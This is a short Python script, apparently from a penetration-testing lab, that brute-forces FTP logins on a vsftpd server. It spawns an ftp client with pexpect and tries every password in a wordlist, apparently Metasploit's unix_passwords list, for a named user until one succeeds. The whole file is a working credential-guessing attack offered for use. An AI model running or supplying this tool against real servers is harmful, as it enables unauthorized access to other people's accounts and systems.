# Usage python vsftpd-brute.py [target] [user] [password wordlist]
# Eg. python vsftpd-brute.py 192.62.102.3 billy /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
import pexpect
import sys
username = sys.argv[2]
password_dict = sys.argv[3]

# Loading the password dictionary and Stripping \n
lines = [line.rstrip('\n') for line in open(password_dict)]

itr = 0
# Iterating over dictionary
for password in lines:
    child = pexpect.spawn('ftp '+sys.argv[1])
    child.expect('Name .*: ')
    child.sendline(username)
    print "Trying with password: ", password
    child.expect('Password:')
    child.sendline(password)
    i = child.expect(['Login successful', 'Login failed'])
    if i == 1:
        #print("Login failed")
        child.kill(0)
    elif i == 0:
        print "Login Successful for ", password
        print child.before
        break
